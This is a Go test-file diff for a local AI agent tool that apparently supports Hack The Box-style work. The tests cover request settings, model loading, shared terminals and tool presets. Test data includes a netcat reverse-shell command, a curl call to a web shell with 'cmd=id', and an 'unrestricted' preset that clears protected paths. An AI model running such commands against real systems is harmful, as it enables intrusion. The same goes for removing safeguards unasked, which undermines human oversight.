@@ -57,7 +57,7 @@ func TestBuildChatRequestUsesAllActiveProfileGenerationSettings(t *testing.T) {
 	}}
 	msgs := []llm.Message{llm.NewTextMessage(llm.RoleUser, "hello")}
 
-	req := buildChatRequest(profile, msgs, tools, "", false)
+	req := buildChatRequest(profile, msgs, tools, "", false, false)
 
 	if req.MaxTokens != 7777 {
 		t.Fatalf("MaxTokens = %d, want 7777", req.MaxTokens)
@@ -98,13 +98,60 @@ func TestBuildChatRequestUsesNoThinkSettingsWhenThinkingDisabled(t *testing.T) {
 		},
 	}
 
-	req := buildChatRequest(profile, nil, nil, "", false)
+	req := buildChatRequest(profile, nil, nil, "", false, false)
 
 	if req.MaxTokens != 2048 || req.Temperature != 0.44 || req.Seed != 88 {
 		t.Fatalf("nothinking params not selected: %#v", req)
 	}
 	if req.EnableThinking {
 		t.Fatalf("EnableThinking = true, want false")
+	}
+}
+
+func TestBuildChatRequestUsesCodingSettingsForNoThinkCodeTasks(t *testing.T) {
+	profile := settings.Profile{
+		Thinking: false,
+		ThinkCoding: settings.GenerationParams{
+			Temperature: 0.6,
+			MaxTokens:   16384,
+			Seed:        22,
+		},
+		NoThink: settings.GenerationParams{
+			Temperature: 0.44,
+			MaxTokens:   8192,
+			Seed:        88,
+		},
+	}
+
+	req := buildChatRequest(profile, nil, nil, "", false, true)
+
+	if req.EnableThinking {
+		t.Fatalf("EnableThinking = true, want false")
+	}
+	if req.MaxTokens != 16384 || req.Temperature != 0.6 || req.Seed != 22 {
+		t.Fatalf("coding params not selected for no-thinking code task: %#v", req)
+	}
+}
+
+func TestBuildChatRequestUsesCodingSettingsForCodeTasks(t *testing.T) {
+	profile := settings.Profile{
+		Thinking: true,
+		ThinkGeneral: settings.GenerationParams{
+			Temperature: 1.0,
+			MaxTokens:   4096,
+			Seed:        11,
+		},
+		ThinkCoding: settings.GenerationParams{
+			Temperature: 0.6,
+			MaxTokens:   8192,
+			Seed:        22,
+		},
+	}
+
+	req := buildChatRequest(profile, nil, nil, "", false, shouldUseCodingParams("please write the full PowerShell script", AgentMode{Name: "Manual"}))
+
+	if req.MaxTokens != 8192 || req.Temperature != 0.6 || req.Seed != 22 {
+		t.Fatalf("coding params not selected for script request: %#v", req)
 	}
 }
 
@@ -170,7 +217,7 @@ func TestEnsureModelLoadedPreventsDoubleLoadUnderConcurrentCalls(t *testing.T) {
 	}
 }
 
-func TestEnsureModelLoadedReloadsWhenBackendContextExceedsProfile(t *testing.T) {
+func TestEnsureModelLoadedReusesBackendContextAboveProfile(t *testing.T) {
 	profile := settings.Profile{
 		Backend:   "llamacpp",
 		BaseURL:   "http://127.0.0.1:8802/v1",
@@ -183,8 +230,50 @@ func TestEnsureModelLoadedReloadsWhenBackendContextExceedsProfile(t *testing.T) 
 	if err := app.ensureModelLoaded(context.Background(), client, profile); err != nil {
 		t.Fatal(err)
 	}
-	if client.loads != 1 {
-		t.Fatalf("loads = %d, want reload when backend context is too large", client.loads)
+	if client.loads != 0 {
+		t.Fatalf("loads = %d, want cached model reused when backend context is larger", client.loads)
+	}
+}
+
+func TestEnsureModelLoadedReusesSameRuntimeForLowerContextRequest(t *testing.T) {
+	loadedProfile := settings.Profile{
+		Backend:   "llamacpp",
+		BaseURL:   "http://127.0.0.1:8802/v1",
+		ModelID:   "qwen",
+		CtxTokens: 32768,
+	}
+	lowerProfile := loadedProfile
+	lowerProfile.CtxTokens = 24576
+	app := &App{loadedModelKey: modelLoadKey(loadedProfile), history: agent.NewHistory(32768)}
+	client := &countingLoader{actualContext: 32768}
+
+	if err := app.ensureModelLoaded(context.Background(), client, lowerProfile); err != nil {
+		t.Fatal(err)
+	}
+	if client.loads != 0 {
+		t.Fatalf("loads = %d, want lower context request to reuse larger loaded runtime", client.loads)
+	}
+}
+
+func TestModelLoadKeySameRuntimeIgnoresOnlyContext(t *testing.T) {
+	loadedProfile := settings.Profile{
+		Backend:   "llamacpp",
+		BaseURL:   "http://127.0.0.1:8802/v1/",
+		ModelID:   "qwen",
+		CtxTokens: 32768,
+		APIKeyEnv: "KEY",
+	}
+	requestedProfile := loadedProfile
+	requestedProfile.BaseURL = "http://127.0.0.1:8802/v1"
+	requestedProfile.CtxTokens = 24576
+
+	if !modelLoadKeySameRuntime(requestedProfile, modelLoadKey(loadedProfile)) {
+		t.Fatal("same backend/model/api key should match even when requested context is lower")
+	}
+
+	requestedProfile.ModelID = "other"
+	if modelLoadKeySameRuntime(requestedProfile, modelLoadKey(loadedProfile)) {
+		t.Fatal("different model should not match the loaded runtime")
 	}
 }
 
@@ -221,6 +310,123 @@ func TestEnsureModelLoadedKeepsCacheWhenBackendContextMatchesProfile(t *testing.
 	}
 	if client.loads != 0 {
 		t.Fatalf("loads = %d, want cached model to be reused", client.loads)
+	}
+}
+
+func TestEnsureModelLoadedRetriesTransientLoadFailure(t *testing.T) {
+	withFastModelLoadRetry(t)
+	profile := settings.Profile{
+		Backend:   "llamacpp",
+		BaseURL:   "http://127.0.0.1:8802/v1",
+		ModelID:   "qwen",
+		CtxTokens: 32768,
+	}
+	app := &App{history: agent.NewHistory(32768)}
+	client := &countingLoader{failuresBeforeSuccess: 1, loadErr: errors.New("bridge starting")}
+	retries := 0
+
+	if err := app.ensureModelLoaded(context.Background(), client, profile, func(int, error) {
+		retries++
+	}); err != nil {
+		t.Fatal(err)
+	}
+	if client.loads != 2 {
+		t.Fatalf("loads = %d, want retry after transient failure", client.loads)
+	}
+	if retries != 1 {
+		t.Fatalf("retries = %d, want 1", retries)
+	}
+	if app.loadedModelKey != modelLoadKey(profile) {
+		t.Fatalf("loadedModelKey was not cached after successful retry")
+	}
+}
+
+func TestEnsureModelLoadedReportsRepeatedLoadFailure(t *testing.T) {
+	withFastModelLoadRetry(t)
+	profile := settings.Profile{
+		Backend:   "llamacpp",
+		BaseURL:   "http://127.0.0.1:8802/v1",
+		ModelID:   "qwen",
+		CtxTokens: 32768,
+	}
+	app := &App{loadedModelKey: modelLoadKey(profile), history: agent.NewHistory(32768)}
+	client := &countingLoader{actualContext: 24576, failuresBeforeSuccess: 99, loadErr: errors.New("health timeout")}
+	retries := 0
+
+	err := app.ensureModelLoaded(context.Background(), client, profile, func(int, error) {
+		retries++
+	})
+	if err == nil {
+		t.Fatal("expected repeated load failure")
+	}
+	if !strings.Contains(err.Error(), "model load failed after 3 attempts") {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if client.loads != 3 {
+		t.Fatalf("loads = %d, want 3 attempts", client.loads)
+	}
+	if retries != 2 {
+		t.Fatalf("retries = %d, want callbacks before attempts 2 and 3", retries)
+	}
+	if app.loadedModelKey != "" {
+		t.Fatalf("loadedModelKey = %q, want cleared after failed reload", app.loadedModelKey)
+	}
+}
+
+func TestRecordBackendRuntimeMismatchAddsWarningForSmallerBackend(t *testing.T) {
+	run := startTaskRun("prompt", "Auto", "profile", "qwen")
+	profile := settings.Profile{
+		Backend:   "llamacpp",
+		BaseURL:   "http://127.0.0.1:8802/v1",
+		ModelID:   "qwen",
+		CtxTokens: 32768,
+	}
+	app := &App{}
+	client := &countingLoader{actualContext: 24576}
+
+	app.recordBackendRuntimeMismatch(context.Background(), client, profile, &run)
+
+	if len(run.Events) != 1 {
+		t.Fatalf("events = %d, want 1", len(run.Events))
+	}
+	if run.Events[0].Kind != "backend_runtime_changed" || !strings.Contains(run.Events[0].Detail, "expected_ctx=32768 actual_ctx=24576") {
+		t.Fatalf("unexpected event: %#v", run.Events[0])
+	}
+}
+
+func TestRecordBackendRuntimeMismatchSkipsMatchingBackend(t *testing.T) {
+	run := startTaskRun("prompt", "Auto", "profile", "qwen")
+	profile := settings.Profile{
+		Backend:   "llamacpp",
+		BaseURL:   "http://127.0.0.1:8802/v1",
+		ModelID:   "qwen",
+		CtxTokens: 32768,
+	}
+	app := &App{}
+	client := &countingLoader{actualContext: 32768}
+
+	app.recordBackendRuntimeMismatch(context.Background(), client, profile, &run)
+
+	if len(run.Events) != 0 {
+		t.Fatalf("events = %#v, want none for matching backend context", run.Events)
+	}
+}
+
+func TestRecordBackendRuntimeMismatchAddsInfoForLargerBackend(t *testing.T) {
+	run := startTaskRun("prompt", "Auto", "profile", "qwen")
+	profile := settings.Profile{
+		Backend:   "llamacpp",
+		BaseURL:   "http://127.0.0.1:8802/v1",
+		ModelID:   "qwen",
+		CtxTokens: 32768,
+	}
+	app := &App{}
+	client := &countingLoader{actualContext: 65536}
+
+	app.recordBackendRuntimeMismatch(context.Background(), client, profile, &run)
+
+	if len(run.Events) != 1 || !strings.Contains(run.Events[0].Detail, "severity=info") {
+		t.Fatalf("expected info event for larger backend context, got %#v", run.Events)
 	}
 }
 
@@ -325,6 +531,65 @@ func TestSetWorkingDirAppliesWorkspaceAndClearsRunContext(t *testing.T) {
 	}
 }
 
+func TestOpenWorkspaceFolderDoesNotChangeAgentRootOrClearContext(t *testing.T) {
+	t.Setenv("MAULER_CONFIG_DIR", t.TempDir())
+	agentRoot := t.TempDir()
+	browseOnly := t.TempDir()
+	restoreWorkingDir(t)
+	if err := os.Chdir(agentRoot); err != nil {
+		t.Fatal(err)
+	}
+
+	cfg := settings.DefaultSettings()
+	cfg.Context.WorkspaceDir = filepath.ToSlash(agentRoot)
+	profiles := settings.DefaultProfiles()
+	app := &App{
+		cfg:      &cfg,
+		profiles: &profiles,
+		history:  agent.NewHistory(4096),
+		rollback: &agent.Rollback{},
+		registry: tools.New(),
+	}
+	app.history.Append(llm.NewTextMessage(llm.RoleUser, "keep this context"))
+
+	folders, err := app.AddWorkspaceFolder(browseOnly, "reference")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got, want := app.GetWorkingDir(), filepath.ToSlash(agentRoot); got != want {
+		t.Fatalf("agent root changed to %q, want %q", got, want)
+	}
+	if app.history.TokenCount() == 0 {
+		t.Fatal("adding a browse-only folder should not clear chat context")
+	}
+	if len(folders) != 2 {
+		t.Fatalf("folders = %#v, want agent root plus browse-only folder", folders)
+	}
+	if folders[1].Path != filepath.ToSlash(browseOnly) || folders[1].Role != "reference" {
+		t.Fatalf("browse folder not saved correctly: %#v", folders)
+	}
+}
+
+func TestNormaliseWorkspaceFoldersPrunesMovedFolders(t *testing.T) {
+	agentRoot := t.TempDir()
+	browseOnly := t.TempDir()
+	missing := filepath.Join(t.TempDir(), "moved-away")
+
+	folders := normaliseAppWorkspaceFolders([]settings.WorkspaceFolder{
+		{Path: missing, Name: "old", Role: "folder"},
+		{Path: browseOnly, Name: "browse", Role: "folder"},
+	}, agentRoot)
+
+	if len(folders) != 2 {
+		t.Fatalf("folders = %#v, want agent root plus existing browse folder", folders)
+	}
+	for _, folder := range folders {
+		if sameFilesystemPath(folder.Path, missing) {
+			t.Fatalf("missing moved folder was not pruned: %#v", folders)
+		}
+	}
+}
+
 func TestUpdateSettingsAppliesWorkspaceDir(t *testing.T) {
 	t.Setenv("MAULER_CONFIG_DIR", t.TempDir())
 	project := t.TempDir()
@@ -402,6 +667,50 @@ func TestStopReasonForBudgetBlock(t *testing.T) {
 	}
 }
 
+func TestBlockingStopReasonKeepsBudgetRunFromCleanDone(t *testing.T) {
+	if !isBlockingStopReason("search_budget_exhausted") {
+		t.Fatal("search budget exhaustion should be a blocking stop reason")
+	}
+	if isBlockingStopReason("tool_error") {
+		t.Fatal("recoverable tool errors should not force blocked final status")
+	}
+}
+
+func TestRequiresLivingDocUpdateAndMutationDetection(t *testing.T) {
+	if !requiresLivingDocUpdate("complete the writeup as you go in Connected.md") {
+		t.Fatal("expected writeup prompt to require doc mutation")
+	}
+	run := startTaskRun("complete writeup", "Builder", "profile", "model")
+	if runHasFileMutation(run) {
+		t.Fatal("empty run should not have file mutation")
+	}
+	run.addTool("edit_file", `{"path":"Connected.md"}`, "ok", "done", 1)
+	if !runHasFileMutation(run) {
+		t.Fatal("edit_file success should count as a file mutation")
+	}
+}
+
+func TestDocumentationRecoveryFiltersToFileTools(t *testing.T) {
+	defs := []llm.ToolDef{
+		{Function: llm.ToolFunctionDef{Name: "shell"}},
+		{Function: llm.ToolFunctionDef{Name: "web_search"}},
+		{Function: llm.ToolFunctionDef{Name: "read_file"}},
+		{Function: llm.ToolFunctionDef{Name: "edit_file"}},
+	}
+	got := filterToolDefsByName(defs, "read_file", "write_file", "edit_file", "glob", "grep")
+	names := make([]string, 0, len(got))
+	for _, def := range got {
+		names = append(names, def.Function.Name)
+	}
+	if strings.Join(names, ",") != "read_file,edit_file" {
+		t.Fatalf("filtered tools = %#v", names)
+	}
+	prompt := documentationRecoveryPrompt("update the writeup", "search_budget_exhausted", "web_search budget exhausted")
+	if !strings.Contains(prompt, "write_file or edit_file") || strings.Contains(prompt, "perform more web") && !strings.Contains(prompt, "Do not perform more web") {
+		t.Fatalf("unexpected recovery prompt: %s", prompt)
+	}
+}
+
 func TestTaskRunKeepsFirstStopReason(t *testing.T) {
 	run := startTaskRun("prompt", "Builder", "profile", "model")
 	run.stop("tool_denied", "denied")
@@ -410,6 +719,29 @@ func TestTaskRunKeepsFirstStopReason(t *testing.T) {
 
 	if run.StopReason != "tool_denied" || run.StopDetail != "denied" {
 		t.Fatalf("unexpected stop fields: %#v", run)
+	}
+}
+
+func TestTaskRunTerminalStopOverridesRecoverableStopReason(t *testing.T) {
+	run := startTaskRun("prompt", "Builder", "profile", "model")
+	run.stop("tool_disabled", "tool \"web_search\" is disabled in settings")
+	run.stopTerminal("chat_error", "HTTP 500: backend completion failed")
+	run.finish("error", "HTTP 500: backend completion failed")
+
+	if run.StopReason != "chat_error" || run.StopDetail != "HTTP 500: backend completion failed" {
+		t.Fatalf("terminal stop did not override stale recoverable stop: %#v", run)
+	}
+}
+
+func TestRecoverableInferenceFailureClassifier(t *testing.T) {
+	if !isRecoverableInferenceFailure(`HTTP 500: {"error":{"message":"Inference failed: error sending request for url (http://127.0.0.1:20688/completion)"}}`) {
+		t.Fatal("expected backend HTTP 500 request failure to be recoverable")
+	}
+	if !isRecoverableInferenceFailure(`Post "http://127.0.0.1:8802/v1/chat/completions": dial tcp 127.0.0.1:8802: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.`) {
+		t.Fatal("expected Windows connectex bridge failure to be recoverable")
+	}
+	if isRecoverableInferenceFailure(`tool "web_search" is disabled in settings`) {
+		t.Fatal("disabled tools should not be treated as recoverable inference failures")
 	}
 }
 
@@ -481,6 +813,28 @@ func TestToolDefsOmittedForConversationalTurn(t *testing.T) {
 	defs, choice = toolDefsAndChoiceForTurn(registry, settings.DefaultSettings().Tools, "fix bug", 0, 0)
 	if choice != "auto" || len(defs) == 0 {
 		t.Fatalf("task turn should expose tools, choice=%q defs=%d", choice, len(defs))
+	}
+}
+
+func TestToolDefsPreferDirectShellForHTBWSLTasks(t *testing.T) {
+	registry := tools.New()
+	cfg := settings.DefaultSettings().Tools
+	cfg.ActiveToolset = "balanced"
+	prompt := "Resume HTB Connected against target IP 10.129.12.172. Use WSL sudo and run nmap before exploitation."
+
+	defs, choice := toolDefsAndChoiceForTurn(registry, cfg, prompt, 0, 0)
+	if choice != "auto" {
+		t.Fatalf("choice = %q, want auto", choice)
+	}
+	seen := map[string]bool{}
+	for _, def := range defs {
+		seen[def.Function.Name] = true
+	}
+	if !seen["shell"] || !seen["bash"] {
+		t.Fatalf("HTB/WSL task should expose direct shell tools, got %#v", seen)
+	}
+	if seen["subagent_research"] {
+		t.Fatalf("HTB/WSL task should not expose web-research subagent for shell work")
 	}
 }
 
@@ -566,6 +920,173 @@ func TestBuildDirectivePromptRequiresToolCall(t *testing.T) {
 	}
 }
 
+func TestAgentToolBudgetSummaryPromptForbidsToolMarkup(t *testing.T) {
+	if !agentToolBudgetExhausted(settings.AgentsConfig{MaxToolCalls: 40}, 40) {
+		t.Fatalf("expected budget to be exhausted at the configured cap")
+	}
+	if agentToolBudgetExhausted(settings.AgentsConfig{MaxToolCalls: 40}, 39) {
+		t.Fatalf("budget should not be exhausted before the configured cap")
+	}
+	prompt := agentToolBudgetSummaryPrompt(40)
+	for _, want := range []string{
+		"Agent tool-call budget is exhausted (40 calls)",
+		"Do not emit tool calls or tool markup",
+		"final progress summary",
+		"ask the user before continuing",
+	} {
+		if !strings.Contains(prompt, want) {
+			t.Fatalf("budget summary prompt missing %q:\n%s", want, prompt)
+		}
+	}
+}
+
+func TestSharedTerminalWrapperUsesMarkers(t *testing.T) {
+	start, donePrefix, wrapped := sharedTerminalWrapper(`printf 'ok\n'`, "abc123")
+	if start != "__MAULER_START_abc123__" {
+		t.Fatalf("start marker = %q", start)
+	}
+	if donePrefix != "__MAULER_DONE_abc123:" {
+		t.Fatalf("done prefix = %q", donePrefix)
+	}
+	for _, want := range []string{"set -o pipefail", "printf '%s\\n'", start, "printf 'ok\\n'", donePrefix, "status=$?"} {
+		if !strings.Contains(wrapped, want) {
+			t.Fatalf("wrapped command missing %q: %s", want, wrapped)
+		}
+	}
+}
+
+func TestSplitSharedTerminalDoneHandlesMarkerAttachedToOutput(t *testing.T) {
+	donePrefix := "__MAULER_DONE_abc123:"
+	status, preDone, ok := splitSharedTerminalDone("200 http://connected.htb/admin/config.php__MAULER_DONE_abc123:0", donePrefix)
+	if !ok {
+		t.Fatal("expected done marker to be detected inside output line")
+	}
+	if status != "0" {
+		t.Fatalf("status = %q, want 0", status)
+	}
+	if preDone != "200 http://connected.htb/admin/config.php" {
+		t.Fatalf("preDone = %q", preDone)
+	}
+}
+
+func TestFormatSharedTerminalResultFiltersWrapperEcho(t *testing.T) {
+	lines := []terminalOutput{
+		{stream: "stderr", data: "root@host:/tmp$ printf '%s\\n' '__MAULER_START_abc123__'; { grep x; }; status=$?; printf '%s%s\\n' '__MAULER_DONE_abc123:' \"$status\""},
+		{stream: "stdout", data: "real output"},
+	}
+	got := formatSharedTerminalResult(lines, "wsl", 0, time.Second)
+	if strings.Contains(got, "__MAULER_START_") || strings.Contains(got, "__MAULER_DONE_") || strings.Contains(got, "printf") {
+		t.Fatalf("wrapper echo leaked into result:\n%s", got)
+	}
+	if !strings.Contains(got, "real output") {
+		t.Fatalf("real output missing:\n%s", got)
+	}
+}
+
+func TestNormalizeToolCallArgumentsDecodesShellEntities(t *testing.T) {
+	tc := llm.ToolCallDef{
+		ID:   "call-1",
+		Type: "function",
+		Function: llm.FunctionCall{
+			Name:      "shell",
+			Arguments: json.RawMessage(`{"command":"curl -sk \"https://10.129.13.198/conn.php?cmd=id\" 2&gt;/dev/null","timeout":15}`),
+		},
+	}
+
+	got := normalizeToolCallArguments(tc)
+	args := string(got.Function.Arguments)
+	if strings.Contains(args, "&gt;") || !strings.Contains(args, `2>/dev/null`) {
+		t.Fatalf("shell tool args were not normalized: %s", args)
+	}
+}
+
+func TestShouldUseSharedTerminal(t *testing.T) {
+	cfg := settings.DefaultSettings().Tools
+	cfg.ShellMode = "shared_terminal"
+	if !shouldUseSharedTerminal(cfg, "shell") || !shouldUseSharedTerminal(cfg, "bash") {
+		t.Fatal("expected shell and bash to use shared terminal")
+	}
+	if shouldUseSharedTerminal(cfg, "read_file") {
+		t.Fatal("non-shell tools should not use shared terminal")
+	}
+	cfg.ShellMode = "isolated"
+	if shouldUseSharedTerminal(cfg, "shell") {
+		t.Fatal("isolated shell mode should not use shared terminal")
+	}
+}
+
+func TestShellRequestsSession(t *testing.T) {
+	cases := []struct {
+		raw  string
+		want bool
+	}{
+		{`{"command":"nmap -sV 10.10.10.10"}`, false},
+		{`{"command":"id","session":false}`, false},
+		{`{"command":"nc -e /bin/bash 10.10.14.2 4444","session":true}`, true},
+		{`{"command":"cd /opt && ls"}`, false},
+	}
+	for _, c := range cases {
+		if got := shellRequestsSession(json.RawMessage(c.raw)); got != c.want {
+			t.Fatalf("shellRequestsSession(%s) = %v, want %v", c.raw, got, c.want)
+		}
+	}
+}
+
+func TestSanitizeTerminalLineStripsPromptControls(t *testing.T) {
+	raw := "\x1b]0;root@HomePc: /mnt/c/Users/richa/Desktop/TheMauler\x07" +
+		"\x1b[01;32mroot@HomePc\x1b[00m:\x1b[01;34m/mnt/c/Users/richa/Desktop/TheMauler\x1b[00m$ \x07"
+	got := sanitizeTerminalLine(raw)
+	if strings.Contains(got, "]0;") || strings.Contains(got, "\x1b") || strings.Contains(got, "\x07") {
+		t.Fatalf("terminal controls leaked through: %q", got)
+	}
+	if got != "root@HomePc:/mnt/c/Users/richa/Desktop/TheMauler$ " {
+		t.Fatalf("sanitizeTerminalLine = %q", got)
+	}
+}
+
+func TestMaulerBashInteractiveArgsUsesAsciiPrompt(t *testing.T) {
+	args := strings.Join(maulerBashInteractiveArgs(), " ")
+	for _, want := range []string{"--rcfile", "test -f ~/.bashrc && . ~/.bashrc", "PROMPT_COMMAND=", "PROMPT_DIRTRIM=3", "PS1='\\\\u@\\\\h:\\\\w\\\\$ '"} {
+		if !strings.Contains(args, want) {
+			t.Fatalf("mauler bash args missing %q: %s", want, args)
+		}
+	}
+}
+
+func TestContextOverflowMarginLeavesRoomNearLoadedContext(t *testing.T) {
+	if got := contextOverflowMargin(40960); got < 3000 {
+		t.Fatalf("margin for 40k context too small: %d", got)
+	}
+}
+
+func TestEnsureRequestContextRoomCompactsBeforeHardOverflow(t *testing.T) {
+	cfg := settings.DefaultSettings()
+	cfg.Context.CompactionAt = 0.95
+	profile := settings.Profile{Name: "qwen", CtxTokens: 40960}
+	app := &App{history: agent.NewHistory(profile.CtxTokens)}
+	app.history.Append(llm.NewTextMessage(llm.RoleSystem, "system"))
+	app.history.Append(llm.NewTextMessage(llm.RoleUser, strings.Repeat("u", 24000)))
+	app.history.Append(llm.NewTextMessage(llm.RoleAssistant, strings.Repeat("a", 24000)))
+	app.history.Append(llm.NewTextMessage(llm.RoleUser, strings.Repeat("b", 24000)))
+	app.history.Append(llm.NewTextMessage(llm.RoleAssistant, strings.Repeat("c", 24000)))
+	app.history.Append(llm.NewTextMessage(llm.RoleUser, strings.Repeat("d", 24000)))
+	app.history.Append(llm.NewTextMessage(llm.RoleAssistant, strings.Repeat("e", 24000)))
+	before := app.history.TokenCount()
+
+	client := &countingLoader{actualContext: 40960}
+	result := app.ensureRequestContextRoom(context.Background(), client, profile, &cfg, nil, nil)
+
+	if result == nil {
+		t.Fatal("expected preflight compaction before hard context overflow")
+	}
+	if app.history.TokenCount() >= before {
+		t.Fatalf("expected preflight compaction to shrink history: before=%d after=%d", before, app.history.TokenCount())
+	}
+	if estimateChatPromptTokens(app.history.Messages(), nil)+contextOverflowMargin(40960) >= 40960 {
+		t.Fatalf("history still estimates too close to context after preflight compaction")
+	}
+}
+
 func TestSanitizeVisibleModelTextRemovesGemmaChannelTokens(t *testing.T) {
 	got := sanitizeVisibleModelText("<|channel|>thought <channel|>Hello! I am TheMauler.")
 	if got != "Hello! I am TheMauler." {
@@ -575,6 +1096,13 @@ func TestSanitizeVisibleModelTextRemovesGemmaChannelTokens(t *testing.T) {
 
 func TestSanitizeVisibleModelTextRemovesMalformedGemmaChannelTokens(t *testing.T) {
 	got := sanitizeVisibleModelText("<|channel>thought <channel|>Hello! I am TheMauler.")
+	if got != "Hello! I am TheMauler." {
+		t.Fatalf("unexpected sanitized text: %q", got)
+	}
+}
+
+func TestSanitizeVisibleModelTextRemovesGemmaChannelThoughtBlock(t *testing.T) {
+	got := sanitizeVisibleModelText("<|channel>thought scratchpad <channel|>Hello! I am TheMauler.")
 	if got != "Hello! I am TheMauler." {
 		t.Fatalf("unexpected sanitized text: %q", got)
 	}
@@ -955,6 +1483,25 @@ func TestLooksAboutToActCatchesInspectionIntent(t *testing.T) {
 	}
 }
 
+func TestThinkingOnlyDiscoveryIntentBuildsInspectionDirective(t *testing.T) {
+	text := "Let me start by discovering the current state of the target and checking existing notes."
+	if !looksAboutToAct(text) {
+		t.Fatalf("thinking-only discovery intent should force a tool directive")
+	}
+	prompt := buildDirectivePrompt(text)
+	if !strings.Contains(prompt, "shell") || !strings.Contains(prompt, "read_file") {
+		t.Fatalf("discovery directive should suggest inspection tools: %s", prompt)
+	}
+}
+
+func TestVisibleTextBeforeInlineToolMarkupKeepsProgressSummary(t *testing.T) {
+	raw := "Good -- the box is running. Let me check known CVEs.\n<|tool_call>call:shell{command:<|\"|>curl http://connected.htb<|\"|>}<tool_call|>"
+	got := visibleTextBeforeInlineToolMarkup(raw)
+	if !strings.Contains(got, "box is running") || strings.Contains(got, "tool_call") || strings.Contains(got, "curl") {
+		t.Fatalf("visibleTextBeforeInlineToolMarkup = %q", got)
+	}
+}
+
 func TestClassifyAgentMode(t *testing.T) {
 	tests := map[string]string{
 		"please review this code":        "Reviewer",
@@ -962,12 +1509,31 @@ func TestClassifyAgentMode(t *testing.T) {
 		"fix the failing build error":    "Fixer",
 		"plan the architecture":          "Planner",
 		"implement the settings page":    "Builder",
+		"make a plan and update files":   "Builder",
 		"hello there":                    "Auto",
 	}
 	for input, want := range tests {
 		if got := classifyAgentMode(input).Name; got != want {
 			t.Fatalf("classifyAgentMode(%q) = %q, want %q", input, got, want)
 		}
+	}
+}
+
+func TestFormatEnabledToolSummaryReflectsEffectiveToolset(t *testing.T) {
+	cfg := settings.DefaultSettings().Tools
+	cfg.ActiveToolset = "offline"
+	summary := formatEnabledToolSummary(cfg)
+	if !strings.Contains(summary, "write and edit files") || !strings.Contains(summary, "run shell commands") {
+		t.Fatalf("offline summary should include local code tools: %s", summary)
+	}
+	if strings.Contains(summary, "search and fetch the web") {
+		t.Fatalf("offline summary should not include web tools: %s", summary)
+	}
+
+	cfg.ActiveToolset = "safe"
+	summary = formatEnabledToolSummary(cfg)
+	if strings.Contains(summary, "write and edit files") || strings.Contains(summary, "run shell commands") {
+		t.Fatalf("safe summary should not claim write/shell access: %s", summary)
 	}
 }
 
@@ -1103,9 +1669,11 @@ func TestAgentPresetContextBudgetDoesNotShrinkLoadContext(t *testing.T) {
 }
 
 func TestApplySafetyPresetUnrestrictedEnablesFullAccess(t *testing.T) {
+	t.Setenv("MAULER_CONFIG_DIR", t.TempDir())
 	cfg := settings.DefaultSettings()
 	cfg.Tools.ConfirmExec = true
 	cfg.Tools.ConfirmWrites = true
+	cfg.Tools.ProtectedPaths = []string{"C:/protected"}
 	cfg.Agents.OfflineOnly = true
 	cfg.Tools.EnabledTools["web_search"] = false
 	app := &App{cfg: &cfg}
@@ -1123,9 +1691,13 @@ func TestApplySafetyPresetUnrestrictedEnablesFullAccess(t *testing.T) {
 	if app.cfg.Tools.ActiveToolset != "unrestricted" {
 		t.Fatalf("unrestricted preset should select unrestricted toolset, got %q", app.cfg.Tools.ActiveToolset)
 	}
+	if len(app.cfg.Tools.ProtectedPaths) != 0 {
+		t.Fatalf("unrestricted preset should clear protected paths: %#v", app.cfg.Tools.ProtectedPaths)
+	}
 }
 
 func TestApplySafetyPresetOfflineSelectsOfflineToolsetAndBlocksBrowserAgent(t *testing.T) {
+	t.Setenv("MAULER_CONFIG_DIR", t.TempDir())
 	cfg := settings.DefaultSettings()
 	app := &App{cfg: &cfg}
 
@@ -1194,13 +1766,44 @@ func TestMemoryNormalisation(t *testing.T) {
 	}
 }
 
+func TestParseWSLDistrosCleansWindowsOutput(t *testing.T) {
+	raw := "\x00 \x00 \x00N\x00A\x00M\x00E\x00 \x00 \x00 \x00 \x00 \x00S\x00T\x00A\x00T\x00E\x00\r\x00\n\x00*\x00 \x00k\x00a\x00l\x00i\x00-\x00l\x00i\x00n\x00u\x00x\x00 \x00 \x00R\x00u\x00n\x00n\x00i\x00n\x00g\x00\r\x00\n\x00 \x00 \x00U\x00b\x00u\x00n\x00t\x00u\x00-\x002\x004\x00.\x000\x004\x00 \x00S\x00t\x00o\x00p\x00p\x00e\x00d\x00\r\x00\n\x00"
+	got := parseWSLDistros(raw)
+	want := []string{"kali-linux", "Ubuntu-24.04"}
+	if len(got) != len(want) {
+		t.Fatalf("parseWSLDistros = %#v, want %#v", got, want)
+	}
+	for i := range want {
+		if got[i] != want[i] {
+			t.Fatalf("parseWSLDistros = %#v, want %#v", got, want)
+		}
+	}
+}
+
 func timeNowRFC3339() string {
 	return "2099-01-01T00:00:00Z"
 }
 
+func withFastModelLoadRetry(t *testing.T) {
+	t.Helper()
+	oldAttempts := modelLoadAttempts
+	oldTimeout := modelLoadAttemptTimeout
+	oldDelays := modelLoadRetryDelays
+	modelLoadAttempts = 3
+	modelLoadAttemptTimeout = 100 * time.Millisecond
+	modelLoadRetryDelays = []time.Duration{0, 0}
+	t.Cleanup(func() {
+		modelLoadAttempts = oldAttempts
+		modelLoadAttemptTimeout = oldTimeout
+		modelLoadRetryDelays = oldDelays
+	})
+}
+
 type countingLoader struct {
-	loads         int
-	actualContext int
+	loads                 int
+	actualContext         int
+	failuresBeforeSuccess int
+	loadErr               error
 }
 
 type summaryClient struct{}
@@ -1233,6 +1836,13 @@ func (c *countingLoader) Name() string {
 
 func (c *countingLoader) LoadModel(context.Context) error {
 	c.loads++
+	if c.failuresBeforeSuccess > 0 {
+		c.failuresBeforeSuccess--
+		if c.loadErr != nil {
+			return c.loadErr
+		}
+		return errors.New("load failed")
+	}
 	if c.actualContext > 0 {
 		c.actualContext = 32768
 	}
